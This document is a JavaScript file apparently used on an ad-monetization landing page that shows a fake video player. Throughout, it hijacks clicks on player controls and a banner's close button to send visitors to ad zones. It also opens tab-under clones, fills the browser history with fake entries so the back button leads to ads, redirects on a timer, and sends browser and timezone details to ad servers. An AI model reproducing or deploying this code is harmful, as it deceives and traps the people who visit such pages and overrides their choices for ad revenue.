/* common.js — FINAL v11 (Hybrid) — FULL (no-push)
   - All exits: mainExit/back/reverse/autoexit/ageExit/tabUnderClick + any custom exits via APP_CONFIG normalizer
   - FAST/SLOW clone behavior (micro-handoff):
       * Player targets: main_play => SLOW clone, micro-controls => FAST clone
   - ClickMap modes (IMPORTANT):
       * APP_CONFIG.clickMapMode = "player" (default) -> capture clickMap ON
       * APP_CONFIG.clickMapMode = "reels"           -> clickMap OFF (safe for stage/swipe scripts)
       * APP_CONFIG.clickMapMode = "off"             -> no clickMap
   - Mini-triggers layer (always ON unless APP_CONFIG.disableMiniTriggers):
       * Any element with [data-mt] triggers exits/micro:
         data-mt="mainExit|back|reverse|autoexit|ageExit|tabUnderClick|<any exit name>|micro"
         data-fast="1" => micro FAST
         data-stop="1" => prevent/stop propagation
   - Reverse popstate filtered by state marker
   - buildDirectUrlWithTracking does safe merge (pass-through original params if missing)
   - Guard against double boot: window.__COMMON_BOOTED__
*/

(() => {
  "use strict";

  // ---------------------------
  // Anti double boot guard
  // ---------------------------
  if (window.__COMMON_BOOTED__) return;
  window.__COMMON_BOOTED__ = "v11-full-nopush";

  // ---------------------------
  // Helpers
  // ---------------------------
  const safe = (fn) => { try { return fn(); } catch { return undefined; } };
  const err  = (...a) => safe(() => console.error("[common]", ...a));

  const replaceTo = (url) => {
    try { window.location.replace(url); } catch { window.location.href = url; }
  };

  // --- Direct open (no about:blank) ---
  const openTab = (url) => {
    try {
      const w = window.open(url, "_blank");
      if (w) { try { w.opener = null; } catch {} }
      return w || null;
    } catch {
      return null;
    }
  };

  // ---------------------------
  // URL + params (snapshot)
  // ---------------------------
  const curUrl = new URL(window.location.href);
  const getSP = (k, def = "") => curUrl.searchParams.get(k) ?? def;

  const CLONE_PARAM = "__cl";
  const isClone = getSP(CLONE_PARAM) === "1";

  const IN = {
    pz: getSP("pz"), tb: getSP("tb"), tb_reverse: getSP("tb_reverse"), ae: getSP("ae"),
    z: getSP("z"), var: getSP("var"), var_1: getSP("var_1"), var_2: getSP("var_2"), var_3: getSP("var_3"),
    b: getSP("b"), campaignid: getSP("campaignid"), abtest: getSP("abtest"), rhd: getSP("rhd", "1"),
    s: getSP("s"), ymid: getSP("ymid"), wua: getSP("wua"),
    use_full_list_or_browsers: getSP("use_full_list_or_browsers"),
    cid: getSP("cid"), geo: getSP("geo"),

    // ExoClick conversions_tracking passthrough
    external_id: getSP("external_id"),

    // Optional passthroughs
    creative_id: getSP("creative_id"),
    ad_campaign_id: getSP("ad_campaign_id"),
    cost: getSP("cost"),
  };

  const qsFromObj = (obj) => {
    const qs = new URLSearchParams();
    Object.entries(obj || {}).forEach(([k, v]) => {
      if (v != null && String(v) !== "") qs.set(k, String(v));
    });
    return qs;
  };

  const getTimezoneName = () => safe(() => Intl.DateTimeFormat().resolvedOptions().timeZone) || "";
  const getTimezoneOffset = () => safe(() => new Date().getTimezoneOffset()) ?? 0;

  const getOsVersion = async () => {
    try {
      const nav = navigator;
      if (!nav.userAgentData?.getHighEntropyValues) return "";
      const v = await nav.userAgentData.getHighEntropyValues(["platformVersion"]);
      return v?.platformVersion || "";
    } catch { return ""; }
  };
  let osVersionCached = "";
  safe(() => getOsVersion().then(v => { osVersionCached = v || ""; }));

  const buildCmeta = () => {
    try {
      const html = document.documentElement;
      const payload = {
        dataVer: html.getAttribute("data-version") || html.dataset.version || "",
        landingName: html.getAttribute("data-landing-name") || html.dataset.landingName || "",
        templateHash: window.templateHash || "",
      };
      return btoa(JSON.stringify(payload));
    } catch { return ""; }
  };

  // ---------------------------
  // Config Normalizer
  // ---------------------------
  const normalizeConfig = (appCfg) => {
    if (!appCfg || typeof appCfg !== "object" || !appCfg.domain) return null;
    const cfg = { domain: appCfg.domain };
    const ensure = (name) => (cfg[name] ||= {});

    Object.entries(appCfg).forEach(([k, v]) => {
      if (v == null || v === "" || k === "domain") return;

      // name_currentTab_zoneId | name_newTab_zoneId | name_currentTab_url | name_newTab_url
      let m = k.match(/^([a-zA-Z0-9]+)_(currentTab|newTab)_(zoneId|url)$/);
      if (m) {
        const [, name, tab, field] = m;
        const ex = ensure(name);
        (ex[tab] ||= {}).domain = field === "zoneId" ? cfg.domain : ex[tab].domain;
        ex[tab][field] = v;
        return;
      }

      // name_count | name_timeToRedirect | name_pageUrl
      m = k.match(/^([a-zA-Z0-9]+)_(count|timeToRedirect|pageUrl)$/);
      if (m) { ensure(m[1])[m[2]] = v; return; }

      // name_zoneId | name_url
      m = k.match(/^([a-zA-Z0-9]+)_(zoneId|url)$/);
      if (m) {
        const [, name, field] = m;
        const ex = ensure(name);
        const tab = (name === "tabUnderClick") ? "newTab" : "currentTab";
        (ex[tab] ||= {}).domain = field === "zoneId" ? cfg.domain : ex[tab].domain;
        ex[tab][field] = v;
      }
    });

    return cfg;
  };

  // ---------------------------
  // URL Builders
  // ---------------------------
  const buildExitQSFast = ({ zoneId }) => {
    const ab2r = IN.abtest || (typeof window.APP_CONFIG?.abtest !== "undefined" ? String(window.APP_CONFIG.abtest) : "");
    const base = {
      ymid: IN.var_1 || IN.var || "",
      var: IN.var_2 || IN.z || "",
      var_3: IN.var_3 || "",

      b: IN.b || "",
      campaignid: IN.campaignid || "",
      click_id: IN.s || "",
      rhd: IN.rhd || "1",

      os_version: osVersionCached || "",
      btz: getTimezoneName(),
      bto: String(getTimezoneOffset()),

      cmeta: buildCmeta(),
      pz: IN.pz || "",
      tb: IN.tb || "",
      tb_reverse: IN.tb_reverse || "",
      ae: IN.ae || "",
      ab2r,

      // tracking passthrough
      external_id: IN.external_id || "",
      creative_id: IN.creative_id || "",
      ad_campaign_id: IN.ad_campaign_id || "",
      cost: IN.cost || "",
    };

    if (zoneId != null && String(zoneId) !== "") base.zoneid = String(zoneId);
    return qsFromObj(base);
  };

  const generateAfuUrlFast = (zoneId, domain) => {
    const host = String(domain || "").trim();
    if (!host) return "";
    const base = host.startsWith("http") ? host : `https://${host}`;
    const url = new URL(base.replace(/\/+$/, "") + "/afu.php");
    url.search = buildExitQSFast({ zoneId }).toString();
    return url.toString();
  };

  // ---------------------------
  // Direct URL builder (tabUnderClick_url / any ex.url)
  // - inject tracking params
  // - pass-through original params if missing (safe merge)
  // ---------------------------
  const buildDirectUrlWithTracking = (baseUrl) => {
    try {
      const u = new URL(String(baseUrl), window.location.href);

      // 1) pass-through everything from landing (only if missing on target)
      for (const [k, v] of curUrl.searchParams.entries()) {
        if (!u.searchParams.has(k) && v != null && String(v) !== "") u.searchParams.set(k, v);
      }

      // 2) enforce key tracking fields (priority)
      const external_id = IN.external_id || "";
      const ad_campaign_id = IN.ad_campaign_id || IN.var_2 || "";
      const creative_id = IN.creative_id || "";
      const cost = IN.cost || IN.b || "";

      if (cost) u.searchParams.set("cost", cost);
      if (!u.searchParams.has("currency")) u.searchParams.set("currency", "usd");

      if (external_id) u.searchParams.set("external_id", external_id);
      if (creative_id) u.searchParams.set("creative_id", creative_id);
      if (ad_campaign_id) u.searchParams.set("ad_campaign_id", ad_campaign_id);

      return u.toString();
    } catch {
      return String(baseUrl || "");
    }
  };

  // ---------------------------
  // Back & Exits
  // ---------------------------
  const pushBackStates = (url, count) => {
    try {
      const n = Math.max(0, parseInt(count, 10) || 0);
      const originalUrl = window.location.href;
      for (let i = 0; i < n; i++) window.history.pushState(null, "Please wait...", url);
      window.history.pushState(null, document.title, originalUrl);
    } catch (e) { err("Back pushState error:", e); }
  };

  const getDefaultBackHtmlUrl = () => {
    const { origin, pathname } = window.location;
    let dir = pathname.replace(/\/(index|back)\.html$/i, "");
    if (dir.endsWith("/")) dir = dir.slice(0, -1);
    if (!dir) return `${origin}/back.html`;
    return `${origin}${dir}/back.html`;
  };

  const initBackFast = (cfg) => {
    const b = cfg?.back?.currentTab;
    if (!b) return;
    const count = cfg.back?.count ?? 10;
    const pageUrl = cfg.back?.pageUrl || getDefaultBackHtmlUrl();
    const page = new URL(pageUrl, window.location.href);

    const qs = buildExitQSFast({ zoneId: b.zoneId });

    if (b.url) qs.set("url", String(b.url));
    else {
      qs.set("z", String(b.zoneId));
      qs.set("domain", String(b.domain || cfg.domain || ""));
    }

    page.search = qs.toString();
    pushBackStates(page.toString(), count);
  };

  const resolveUrlFast = (ex, cfg) => {
    if (!ex) return "";
    if (ex.url) return buildDirectUrlWithTracking(ex.url);
    if (ex.zoneId && (ex.domain || cfg?.domain)) return generateAfuUrlFast(ex.zoneId, ex.domain || cfg.domain);
    return "";
  };

 /* ===========================
   EXIT RUNNERS (CURRENT / DUAL) + DISPATCHER
   PURPOSE:
     - currentTab exit
     - dual exit (newTab + currentTab) with popup-safe order:
       openTab() -> initBack() -> replaceTo()
   RULE:
     - Replace your existing:
       runExitCurrentTabFast, runExitDualTabsFast, run
     - Paste this block exactly.
   =========================== */

const runExitCurrentTabFast = (cfg, name, withBack = true) => {
  const ex = cfg?.[name]?.currentTab;
  if (!ex) return;

  const url = resolveUrlFast(ex, cfg);
  if (!url) return;

  safe(() => window.syncMetric?.({ event: name, exitZoneId: ex.zoneId || ex.url }));

  if (withBack) {
    initBackFast(cfg);
    setTimeout(() => replaceTo(url), 40);
  } else {
    replaceTo(url);
  }
};

const runExitDualTabsFast = (cfg, name, withBack = true) => {
  const ex = cfg?.[name];
  if (!ex) return;

  const ct = ex.currentTab;
  const nt = ex.newTab;

  const ctUrl = resolveUrlFast(ct, cfg);
  const ntUrl = resolveUrlFast(nt, cfg);

  safe(() => {
    if (ctUrl) window.syncMetric?.({ event: name, exitZoneId: ct?.zoneId || ct?.url });
    if (ntUrl) window.syncMetric?.({ event: name, exitZoneId: nt?.zoneId || nt?.url });
  });

  // 1) OPEN NEW TAB FIRST (popup-safe, must be inside user gesture)
  if (ntUrl) openTab(ntUrl);

  // 2) BACK QUEUE (current tab)
  if (withBack) initBackFast(cfg);

  // 3) REDIRECT CURRENT TAB
  if (ctUrl) setTimeout(() => replaceTo(ctUrl), 40);
};

const run = (cfg, name) => {
  if (!name) return;

  // fallback: if tabUnderClick missing -> behave like mainExit
  if (name === "tabUnderClick" && !cfg?.tabUnderClick) {
    return cfg?.mainExit?.newTab
      ? runExitDualTabsFast(cfg, "mainExit", true)
      : runExitCurrentTabFast(cfg, "mainExit", true);
  }

  if (cfg?.[name]?.newTab) return runExitDualTabsFast(cfg, name, true);
  return runExitCurrentTabFast(cfg, name, true);
};
  // ---------------------------
  // Reverse, Autoexit, Ready
  // ---------------------------
  const initReverse = (cfg) => {
    if (!cfg?.reverse?.currentTab) return;
    safe(() => window.history.pushState({ __rev: 1 }, "", window.location.href));
    window.addEventListener("popstate", (e) => {
      if (e?.state && e.state.__rev === 1) runExitCurrentTabFast(cfg, "reverse", false);
    });
  };

  const initAutoexit = (cfg) => {
    if (!cfg?.autoexit?.currentTab) return;
    const sec = parseInt(cfg.autoexit.timeToRedirect, 10) || 90;
    let armed = false;

    const trigger = () => {
      if (document.visibilityState === "visible" && armed) runExitCurrentTabFast(cfg, "autoexit", true);
    };

    const timer = setTimeout(() => { armed = true; trigger(); }, sec * 1000);

    const cancel = () => {
      clearTimeout(timer);
      document.removeEventListener("visibilitychange", trigger);
    };

    document.addEventListener("visibilitychange", trigger);
    ["mousemove", "click", "scroll"].forEach(ev => document.addEventListener(ev, cancel, { once: true }));
  };

  const isPlayerReady = () => {
    const btn = document.querySelector(".xh-main-play-trigger");
    return !!(btn && btn.classList.contains("ready"));
  };

  // ---------------------------
  // Micro Handoff (clone + tabUnderClick redirect)
  // ---------------------------
  const MICRO_DONE_KEY = "__micro_done";

  const buildCloneUrl = (fast) => {
    const u = new URL(window.location.href);
    u.searchParams.set(CLONE_PARAM, "1");

    // FAST vs SLOW for your frameLoader
    if (fast) u.searchParams.set("__fast", "1");
    else u.searchParams.delete("__fast");

    // (optional compat marker, but ONLY for fast now)
    if (fast) u.searchParams.set("__skipPreview", "1");
    else u.searchParams.delete("__skipPreview");

    // sync video OR fake image
    const video = document.querySelector("video");
    const imgFrame = document.querySelector(".xh-frame");

    if (video) {
      u.searchParams.set("t", video.currentTime || 0);
      const poster = video.getAttribute("poster");
      if (poster) u.searchParams.set("__poster", poster);
    } else if (imgFrame) {
      u.searchParams.set("t", 0);
      if (imgFrame.src) u.searchParams.set("__poster", imgFrame.src);
    }

    return u.toString();
  };

  const runMicroHandoff = (cfg, fast) => {
    if (isClone) return;

    if (safe(() => sessionStorage.getItem(MICRO_DONE_KEY)) === "1") return run(cfg, "mainExit");
    safe(() => sessionStorage.setItem(MICRO_DONE_KEY, "1"));

    const cloneUrl = buildCloneUrl(!!fast);
    safe(() => window.syncMetric?.({ event: fast ? "micro_open_clone_fast" : "micro_open_clone_slow" }));
    openTab(cloneUrl);

    const ex = cfg?.tabUnderClick?.newTab || cfg?.tabUnderClick?.currentTab;
    const monetUrl = resolveUrlFast(ex, cfg);
    if (monetUrl) {
      safe(() => window.syncMetric?.({ event: "tabUnderClick" }));
      initBackFast(cfg);
      setTimeout(() => replaceTo(monetUrl), 40);
    } else {
      run(cfg, "mainExit");
    }
  };

  // ---------------------------
  // Mini Triggers (универсальный слой)
  // ---------------------------
  const initMiniTriggers = (cfg) => {
    if (window.APP_CONFIG?.disableMiniTriggers) return;

    document.addEventListener("click", (e) => {
      const el = e.target?.closest?.("[data-mt]");
      if (!el) return;

      const name = (el.getAttribute("data-mt") || "").trim();
      if (!name) return;

      const stop = el.getAttribute("data-stop") === "1";
      const fast = el.getAttribute("data-fast") === "1";

      if (stop) {
        e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
      }

      if (name === "micro") {
        runMicroHandoff(cfg, fast);
        return;
      }

      run(cfg, name);
    }, true);
  };

  // ---------------------------
  // Click Map (PLAYER mode only)
  // ---------------------------
  const initClickMap = (cfg) => {
    const fired = { mainExit: false, back: false };
    const microTargets = new Set([
      "timeline", "play_pause", "mute_unmute", "settings", "fullscreen", "pip_top", "pip_bottom"
    ]);

    // helper: decide fast vs slow per click
    const consumeFastFlag = (fallback) => {
      const v = (window.__FAST_CLICK__ === true);
      // reset immediately so next click doesn't inherit accidentally
      window.__FAST_CLICK__ = false;
      return v || !!fallback;
    };

    document.addEventListener("click", (e) => {
      const zone = e.target?.closest?.("[data-target]");
      const t = zone?.getAttribute("data-target") || "";
      const modal = document.getElementById("xh_exit_modal");
      const banner = document.getElementById("xh_banner");

      // 0) PLAY FLOW:
      // ORIGINAL: main_play -> micro handoff (clone + tabUnder)
      // CLONE:    main_play -> mainExit (dual)
      if (t === "main_play") {
        e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();

        if (isClone) {
          if (fired.mainExit) return;
          fired.mainExit = true;
          run(cfg, "mainExit");
          return;
        }

        // main_play => SLOW
        runMicroHandoff(cfg, false);
        return;
      }

      // 1) BANNER: IMAGE -> MAIN EXIT
      if (t === "banner_main") {
        e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
        run(cfg, "mainExit");
        return;
      }

      // 2) BANNER: CLOSE -> MICRO HANDOFF (FAST by default)
      if (t === "banner_close") {
        e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
        if (banner) banner.style.display = "none";
        runMicroHandoff(cfg, true);
        return;
      }

      // 3) BACK UI BUTTON -> SHOW MODAL
      if (t === "back_button") {
        e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
        if (modal) {
          modal.style.display = "flex";
          modal.setAttribute("aria-hidden", "false");
          fired.back = true;
        }
        return;
      }

      // 4) MODAL: STAY -> MICRO HANDOFF (SLOW by default)
      if (t === "modal_stay") {
        e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
        if (modal) { modal.style.display = "none"; modal.setAttribute("aria-hidden", "true"); }
        runMicroHandoff(cfg, false);
        return;
      }

      // 5) MODAL: LEAVE -> AGE EXIT (dual)
      if (t === "modal_leave") {
        e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
        if (modal) { modal.style.display = "none"; modal.setAttribute("aria-hidden", "true"); }
        run(cfg, "ageExit");
        return;
      }

      // 6) CLONE -> MAIN EXIT (any click)
      if (isClone) {
        if (fired.mainExit) return;
        fired.mainExit = true;
        e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
        run(cfg, "mainExit");
        return;
      }

      // 7) MICRO CONTROLS -> MICRO HANDOFF (FAST)
      if (microTargets.has(t)) {
        e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
        const fast = consumeFastFlag(true); // always fast for microTargets
        runMicroHandoff(cfg, fast);
        return;
      }

      // 8) MAIN EXIT (all others)
      if (fired.mainExit) return;
      fired.mainExit = true;
      e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
      run(cfg, "mainExit");
    }, true);
  };

  // ---------------------------
  // Boot
  // ---------------------------
  const boot = () => {
    if (typeof window.APP_CONFIG === "undefined") {
      document.body.innerHTML = "<p style='color:#fff;padding:12px'>MISSING APP_CONFIG</p>";
      return;
    }

    const cfg = normalizeConfig(window.APP_CONFIG);
    if (!cfg) return;

    // Public API
    window.LANDING_EXITS = {
      cfg,
      run: (name) => run(cfg, name),
      initBack: () => initBackFast(cfg),
      microHandoff: (fast) => runMicroHandoff(cfg, fast),
      isPlayerReady,
      isClone,
    };

    // Always-on pieces (no push)
    initMiniTriggers(cfg);
    initAutoexit(cfg);
    initReverse(cfg);

    // ClickMap modes
    const mode = String(window.APP_CONFIG?.clickMapMode || "player").toLowerCase();
    if (mode === "player") initClickMap(cfg);
    // reels/off => do not attach clickMap
  };

  if (document.readyState === "loading") document.addEventListener("DOMContentLoaded", boot);
  else boot();
})();
